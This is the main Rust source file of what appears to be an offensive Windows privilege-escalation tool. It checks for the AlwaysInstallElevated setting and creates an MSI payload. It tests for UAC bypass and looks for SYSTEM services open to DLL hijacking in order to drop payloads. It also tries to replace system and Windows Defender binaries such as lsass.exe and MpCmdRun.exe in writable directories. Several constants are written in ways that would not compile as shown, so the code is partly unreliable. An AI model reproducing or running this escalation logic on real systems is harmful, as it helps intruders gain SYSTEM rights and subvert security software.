mod service_handler;
mod registry_handler;
mod payload_generator;
mod filesystem_handler;

use filesystem_handler::{CanEditDirectory};
use service_handler::{GetServices, CheckServices};
use registry_handler::{CheckInstallRegistry, CheckUACSecurity};
use payload_generator::{SelectCreationPayload, CreateMSIPayload, CreateEXEPayload};

use std::{
    process::exit,
    ffi::OsString,
    fs::{DirEntry, File, ReadDir, read_dir},
};

const INFO_HEAD: &str = "\x1b[36m[i]\x1b[0m ";
const IMPT_HEAD: &str = "\x1b[34m[#]\x1b[0m ";
const MISC_HEAD: &str = "\x1b[35m[*]\x1b[0m ";
const EROR_HEAD: &str = "\x1b[31m[!]\x1b[0m ";
const PASS_HEAD: &str = "\x1b[32m[+]\x1b[0m ";
const FAIL_HEAD: &str = "\x1b[91m[-]\x1b[0m ";

const target_users: Vec<String> = vec![
    "nt authority\\localservice".to_string(), "nt authority\\networkservice".to_string(),
    "localsystem".to_string()
];
const target_directories: Vec<String> = vec![
    "C:\\Windows\\System32\\".to_string(),
    "C:\\Program Files\\Windows Defender\\".to_string(),
    "C:\\Program Files (x86)\\Windows Defender\\".to_string()
];
const target_programs: Vec<String> = vec![
    "C:\\Windows\\System32\\svchost.exe".to_string(),
    "C:\\Windows\\System32\\spoolsv.exe".to_string(),
    "C:\\Windows\\System32\\lsass.exe".to_string(),
    "C:\\Program Files\\Windows Defender\\MpCmdRun.exe".to_string(),
    "C:\\Program Files (x86)\\Windows Defender\\MpCmdRun.exe".to_string(),
];
const target_dlls: Vec<String> = vec![
    "".to_string(),
];

fn end_program()
{
    println!("{}End of program.", IMPT_HEAD);
    println!("Rise to what is restricted.");
    exit(0);
}

fn main()
{
    println!("{}Start of program.", IMPT_HEAD);
    // Check "Always install elevated" permissions
    println!("{}Checking for MSI installer escilation...", INFO_HEAD);
    if CheckInstallRegistry()
    {
        println!("{}Computer is vulnerable to MSI installer file escilation!", PASS_HEAD);
        if CreateMSIPayload()
        {
            println!("{}Created MSI binary for escilation!", PASS_HEAD);
            end_program();
        } else {
            println!("{}Failed to create MSI binary for escilation!", FAIL_HEAD);
        }
    } else {
        println!("{}Computer is not vulnerable to MSI installer file esciation.", FAIL_HEAD);
    }
    // Check UAC settings
    println!("{}Checking for UAC bypass...", INFO_HEAD);
    if CheckUACSecurity()
    {
        println!("{}Computer is vulnerable to UAC bypass!", PASS_HEAD);
    } else {
        println!("{}Computer is not vulnerable to UAC bypass.", FAIL_HEAD);
    }
    // Check services and loaded DLLs
    println!("{}Checking services for possible DLL hyjacking...", INFO_HEAD);
    let services: Vec<(String, String, String)> = GetServices();
    if services.len() > 0
    {
        println!("{}Found {:?} possible services!", PASS_HEAD, services.len());
        let vulnerable_services: Vec<(String, String, String)> = CheckServices(&services);
        if vulnerable_services.len() > 0
        {
            println!("{}Found {:?} vulnerable services!", PASS_HEAD, vulnerable_services.len());
            println!("{}Enumerating vulnerable services...", INFO_HEAD);
            for service in vulnerable_services
            {
                let (service_binary, service_name, service_user) = &service;
                if !target_users.contains(&service_user.to_lowercase())
                {
                    println!("{}Will not attempt service due to not running as SYSTEM user.", INFO_HEAD);
                } else {
                    println!("{}Scanning service {:?} which starts as {:?}", MISC_HEAD, service_name, service_user);
                    let (payload_creation_result, _) = SelectCreationPayload(service_binary.to_owned());
                    if payload_creation_result
                    {
                        println!("{}Created payload, ending program!", PASS_HEAD);
                        end_program();
                    } else {
                        println!("{}Failed to create payload...", FAIL_HEAD);
                    }
                }
            }
        } else {
            println!("{}No vulnerable services found.", FAIL_HEAD);
        }
    } else {
        println!("{}Failed to get services!", EROR_HEAD);
    }
    // Check common path and folder permissions
    println!("{}Checking known file paths and permissions...", INFO_HEAD);
    for directory in target_directories
    {
        if CanEditDirectory(&directory)
        {
            println!("{}Can edit directory: {:?}!", PASS_HEAD, directory);
            println!("{}Dropping program replacement...", INFO_HEAD);
            for target_program in target_programs
            {
                if target_program.contains(directory)
                {
                    let (replacement_result, replacement_type) = SelectCreationPayload(target_program.clone());
                    if replacement_result
                    {
                        println!("{}Replaced target program: {:?} with custom template!", PASS_HEAD, target_program);
                        end_program();
                    } else {
                        println!("{}Failed to replace target program: {:?}", FAIL_HEAD, target_program);
                    }
                }
            }
        }
    }
    // Check startup items
    // Check scheduled task items
    end_program();
}